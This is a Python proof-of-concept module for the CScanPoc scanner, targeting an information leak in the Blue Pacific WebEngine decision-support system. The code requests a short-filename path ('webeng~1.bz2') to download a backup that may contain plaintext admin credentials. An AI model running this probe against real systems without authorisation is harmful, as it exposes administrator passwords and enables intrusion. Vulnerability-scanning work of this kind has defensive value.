# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'BluePacific_0001'  # 平台漏洞编号，留空
    name = '蓝太平洋网站决策支持系统WebEngine 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-08-12'  # 漏洞公布时间
    desc = '''
        蓝太平洋网站决策支持系统WebEngine存在利用短文件漏洞下载明文系统配置文件(可泄漏管理员明文密码等系统敏感配置信息)
        部分部署安装在 win+apache 环境下存在缺陷通过短文件漏洞实现利用。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '蓝太平洋'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '64d9d206-6457-4603-891c-b8760dce2381'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:wooyun-2015-0132719
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/webengine/backuppro/backup/webeng~1.bz2"
            code, head, res, _, _ = hh.http(arg + payload)
            if code == 200 and 'application/x-bzip2' in head:
                # security_warning(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
